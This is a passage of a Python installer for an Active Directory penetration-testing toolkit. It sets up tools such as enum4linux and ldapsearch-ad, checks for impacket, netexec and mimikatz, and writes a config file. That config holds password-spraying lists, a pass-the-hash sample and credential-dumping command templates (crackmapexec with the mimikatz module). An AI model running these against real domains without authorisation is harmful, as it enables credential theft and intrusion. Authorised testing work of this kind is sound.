            os.chmod(enum4linux_pl, 0o755)
            
            # Create a symlink or batch file
            if self.is_windows:
                batch_file = self.base_dir / "enum4linux.bat"
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\nperl {enum4linux_pl} %*")
                Logger.success(f"Created batch file for enum4linux: {batch_file}")
            else:
                symlink_path = self.base_dir / "enum4linux"
                try:
                    os.symlink(enum4linux_pl, symlink_path)
                    Logger.success(f"Created symlink for enum4linux: {symlink_path}")
                except Exception as e:
                    Logger.warning(f"Failed to create symlink for enum4linux: {str(e)}")
            
            Logger.success("enum4linux installed successfully")
            self.installed_tools.add("enum4linux")
            return True
        else:
            Logger.error("enum4linux.pl not found in the downloaded repository")
            return False
    
    def install_ldapsearch_ad(self) -> bool:
        """Install ldapsearch-ad"""
        Logger.section("Installing ldapsearch-ad")
        
        ldapsearch_dir = self.get_github_repo("ldapsearch-ad", self.tool_urls["ldapsearch-ad"])
        if not ldapsearch_dir:
            return False
        
        # Make the main script executable
        ldapsearch_py = ldapsearch_dir / "ldapsearch-ad.py"
        if ldapsearch_py.exists():
            os.chmod(ldapsearch_py, 0o755)
            
            # Create a symlink or batch file
            if self.is_windows:
                batch_file = self.base_dir / "ldapsearch-ad.bat"
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\n{self.python_command} {ldapsearch_py} %*")
                Logger.success(f"Created batch file for ldapsearch-ad: {batch_file}")
            else:
                symlink_path = self.base_dir / "ldapsearch-ad"
                try:
                    os.symlink(ldapsearch_py, symlink_path)
                    Logger.success(f"Created symlink for ldapsearch-ad: {symlink_path}")
                except Exception as e:
                    Logger.warning(f"Failed to create symlink for ldapsearch-ad: {str(e)}")
            
            Logger.success("ldapsearch-ad installed successfully")
            self.installed_tools.add("ldapsearch-ad")
            return True
        else:
            Logger.error("ldapsearch-ad.py not found in the downloaded repository")
            return False
    
    def create_config_file(self) -> bool:
        """Create a starter config.py file"""
        Logger.section("Creating config.py file")
        
        config_path = self.base_dir / "config.py"
        if config_path.exists() and not self.force:
            Logger.info(f"config.py already exists at {config_path}. Skipping creation.")
            return True
        
        config_content = """#!/usr/bin/env python3
\"\"\"
Shared configuration file for AD Pentest Tools
This file contains credentials, targets, and settings used by all tools in the suite.
\"\"\"

# Target IP addresses or hostnames
TARGETS = [
    "192.168.1.100",  # Example DC
    "10.0.0.5",       # Example file server
    # Add more targets as needed
]

# Domain user credentials to try
DOMAIN_USERS = [
    "Administrator",
    "admin",
    "svc_sql",
    "svc_web",
    "helpdesk",
    "backup",
    # Add more usernames as needed
]

# Passwords to try (for password spraying)
DOMAIN_PASSWORDS = [
    "Password123!",
    "Spring2023!",
    "Winter2023!",
    "Company2023!",
    "P@ssw0rd",
    "Welcome1",
    # Add more passwords as needed
]

# NTLM hashes to try (for pass-the-hash)
NTLM_HASHES = [
    "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",  # Example hash
    # Add more hashes as needed
]

# Command execution settings
TIMEOUT = 60  # Seconds to wait for command execution
MAX_THREADS = 10  # Maximum number of parallel threads

# Logging settings
LOG_DIRECTORY = "logs"
RESULTS_DIRECTORY = "results"
LOG_LEVEL = "INFO"  # DEBUG, INFO, WARNING, ERROR, CRITICAL

# Tool-specific settings
NETEXEC_SETTINGS = {
    "retries": 3,
    "domain": "contoso.local",  # Default domain to use
    "modules": ["mimikatz", "lsassy", "spider_plus"]
}

KERBEROAST_SETTINGS = {
    "wordlist": "wordlists/rockyou.txt",
    "hash_mode": 13100,  # Hashcat mode for Kerberos TGS tickets
    "rules": ["rules/best64.rule"],
    "crack_timeout": 3600  # Seconds to allow for cracking
}

BLOODHOUND_SETTINGS = {
    "collection_methods": ["All"],
    "domain": "contoso.local",
    "neo4j_uri": "bolt://localhost:7687",
    "neo4j_user": "neo4j",
    "neo4j_password": "BloodHound"
}

# Impacket settings
IMPACKET_SETTINGS = {
    "domain": "contoso.local",
    "dc_ip": "",  # Will be set dynamically to target IP if empty
}

# Additional enumeration commands to run
ADDITIONAL_COMMANDS = {
    "smb": [
        "smbclient -L //{target} -U {username}%{password}",
        "crackmapexec smb {target} -u {username} -p {password} -M mimikatz"
    ],
    "ldap": [
        "ldapsearch -x -h {target} -D '{domain}\\\\{username}' -w {password} -b 'DC={domain_part1},DC={domain_part2}' '(objectClass=user)'",
        "ldapsearch-ad --dc {target} -d {domain} -u {username} -p {password} --da"
    ]
}

# Custom functions for special handling
def parse_domain(domain_string):
    \"\"\"Parse domain string into parts for LDAP queries\"\"\"
    parts = domain_string.split('.')
    return parts

def obfuscate_password(password):
    \"\"\"Return an obfuscated version of the password for logging\"\"\"
    if not password:
        return ""
    return "*" * len(password)
"""
        
        with open(config_path, 'w') as f:
            f.write(config_content)
        
        Logger.success(f"Created config.py at {config_path}")
        return True
    
    def verify_installation(self) -> bool:
        """Verify that all required tools are installed and accessible"""
        Logger.section("Verifying Installation")
        
        # Tools to check and how to check them
        tools_to_check = {
            "python": [self.python_command, "--version"],
            "impacket": ["ls", str(self.tools_dir / "impacket")],
            "netexec": ["ls", str(self.tools_dir / "netexec")],
            "bloodhound-python": ["ls", str(self.tools_dir / "BloodHound.py")],
            "SharpView.exe": ["ls", str(self.base_dir / "SharpView.exe")],
            "mimikatz": ["ls", str(self.tools_dir / "mimikatz")]
        }
        
        verification_results = {}
        
        for tool_name, check_command in tools_to_check.items():
            try:
                cmd = check_command[0]
                args = check_command[1:]
                
                # Special case for directory/file checks
                if cmd == "ls":
                    file_path = Path(args[0])
                    if file_path.exists():
                        Logger.success(f"{tool_name} found at {file_path}")
                        verification_results[tool_name] = True
                    else:
                        Logger.error(f"{tool_name} not found at {file_path}")
                        verification_results[tool_name] = False
                else:
                    # Try to run the command to verify it works
                    process = subprocess.run([cmd] + args, capture_output=True, text=True)
                    if process.returncode == 0 or "--help" in args:
                        Logger.success(f"{tool_name} is working correctly")
                        verification_results[tool_name] = True
                    else:
                        Logger.error(f"{tool_name} check failed: {process.stderr}")
                        verification_results[tool_name] = False
            except FileNotFoundError:
                Logger.error(f"{tool_name} not found in PATH")
                verification_results[tool_name] = False
            except Exception as e:
                Logger.error(f"Error checking {tool_name}: {str(e)}")
                verification_results[tool_name] = False
        
        # Check for project scripts
        script_files = [
            "netexec-enumerator.py",
            "kerberoast.py",
            "impacket-toolkit.py",
            "powershell-enumeration.py",
            "mimikatz-wrapper.py",
            "sharpview-automator.py",
            "adpentest-toolkit.py",
            "ad-autorecon.py"
        ]
        
        Logger.subsection("Checking for project scripts")
        for script in script_files:
            script_path = self.base_dir / script
            if script_path.exists():
                Logger.success(f"{script} found at {script_path}")
                verification_results[script] = True
            else:
                Logger.warning(f"{script} not found. You may need to download it separately.")
                verification_results[script] = False
        
        # Summarize results
        success_count = sum(1 for result in verification_results.values() if result)
        failure_count = sum(1 for result in verification_results.values() if not result)
        
        Logger.section("Verification Summary")
        Logger.info(f"Total tools and scripts checked: {len(verification_results)}")
        Logger.success(f"Successfully verified: {success_count}")
        
        if failure_count > 0:
            Logger.warning(f"Failed verifications: {failure_count}")
            
            # List failed tools
            Logger.info("The following tools or scripts need attention:")
            for tool, result in verification_results.items():
                if not result:
                    Logger.warning(f"- {tool}")
        else:
            Logger.success("All tools and scripts were verified successfully!")
        
        return failure_count == 0
    
    def run_installation(self):
        """Run the complete installation process"""
        Logger.section("AD Pentest Tools Installation")
        Logger.info(f"Installation directory: {self.base_dir}")
        
        # Install Python dependencies first
        python_deps_ok = self.install_python_dependencies()
        if not python_deps_ok:
            Logger.warning("Python dependencies installation had issues. Some tools may not work correctly.")
        
        # Install each tool
        installation_steps = [
            ("impacket", self.install_impacket),
            ("bloodhound_py", self.install_bloodhound_py),
            ("kerberoast", self.install_kerberoast),
            ("crackmapexec", self.install_crackmapexec),
            ("powershell_tools", self.install_powershell_tools),
            ("mimikatz", self.install_mimikatz),
            ("seclists", self.install_seclists),
            ("ghostpack", self.install_ghostpack),
            ("sharphound", self.install_sharphound),
            ("responder", self.install_responder),
            ("bloodhound", self.install_bloodhound),
            ("enum4linux", self.install_enum4linux),
            ("ldapsearch-ad", self.install_ldapsearch_ad)
        ]
        
        installation_results = {}
        
        for tool_name, install_func in installation_steps:
            Logger.info(f"Installing {tool_name}...")
            try:
                result = install_func()
                installation_results[tool_name] = result
                if result:
                    Logger.success(f"{tool_name} installation completed successfully")
                else:
                    Logger.error(f"{tool_name} installation failed")
            except Exception as e:
                Logger.error(f"Error installing {tool_name}: {str(e)}")
                installation_results[tool_name] = False
        
        # Create config file
        config_created = self.create_config_file()
        
        # Verify installation
        verification_ok = self.verify_installation()
        
        # Summarize results
        success_count = sum(1 for result in installation_results.values() if result)
        failure_count = sum(1 for result in installation_results.values() if not result)
        
        Logger.section("Installation Summary")
        Logger.info(f"Total tools attempted: {len(installation_results)}")
        Logger.success(f"Successfully installed: {success_count}")
        
        if failure_count > 0:
            Logger.warning(f"Failed installations: {failure_count}")
            
            # List failed installations
            Logger.info("The following tools need attention:")
            for tool, result in installation_results.items():
                if not result:
                    Logger.warning(f"- {tool}")
        else:
            Logger.success("All tools were installed successfully!")
        
        if not config_created:
            Logger.warning("Failed to create config.py")
        
        if not verification_ok:
            Logger.warning("Some tools could not be verified. You may need to install them manually.")
        
        Logger.section("Next Steps")
        Logger.info("1. Review and update the config.py file with your specific settings")
        Logger.info("2. Run 'python check-environment.py' to further verify the environment")
        Logger.info("3. Test individual tools to ensure they work correctly")
        Logger.info("4. Consider adding the tools directory to your PATH for easier access")
        
                        # Create a simple README file with usage instructions
        readme_path = self.base_dir / "TOOLKIT_README.md"
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write(f"""# AD Pentest Toolkit Installation Results

Installation completed on: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

## Installation Summary
- Total tools attempted: {len(installation_results)}
- Successfully installed: {success_count}
- Failed installations: {failure_count}

## Tools Status
{os.linesep.join([f"- {tool}: {'Success' if result else 'Failed'}" for tool, result in installation_results.items()])}

## Installed Tool Locations
- Base directory: {self.base_dir}
- Tools directory: {self.tools_dir}
- Scripts directory: {self.scripts_dir}
- Results directory: {self.results_dir}
- Logs directory: {self.logs_dir}

## Next Steps
1. Review and update the config.py file with your specific settings
2. Run 'python check-environment.py' to further verify the environment
3. Test individual tools to ensure they work correctly
4. Consider adding the tools directory to your PATH for easier access

## Usage
For detailed usage instructions, refer to the project documentation.
""")
        
        Logger.success(f"Created installation summary at {readme_path}")
        Logger.success("Installation process completed!")

def main():
    parser = argparse.ArgumentParser(description='AD Pentest Tools Installer')
    parser.add_argument('--dir', help='Base directory for installation (default: current directory)')
    parser.add_argument('--force', action='store_true', help='Force reinstallation of all tools')
    parser.add_argument('--skip-python-deps', action='store_true', help='Skip Python dependencies installation')
    parser.add_argument('--tools', nargs='+', help='Specific tools to install (default: all)')
    
    args = parser.parse_args()
    
    # Header
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'AD Pentest Tools Installer'.center(60)}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 60}{Colors.ENDC}\n")
    
    # Print system information
    print(f"{Colors.CYAN}System Information:{Colors.ENDC}")
    print(f"  OS: {platform.system()} {platform.release()}")
    print(f"  Python: {platform.python_version()}")
    print(f"  Installation directory: {args.dir or os.getcwd()}")
    print()
    
    # Confirmation
    if not args.force:
        confirm = input(f"{Colors.YELLOW}This will install multiple penetration testing tools. Continue? (y/n): {Colors.ENDC}")
        if confirm.lower() != 'y':
            print(f"{Colors.RED}Installation aborted.{Colors.ENDC}")
            return
    
    installer = ToolInstaller(base_dir=args.dir, force=args.force, skip_python_deps=args.skip_python_deps)
    installer.run_installation()

if __name__ == "__main__":
    main()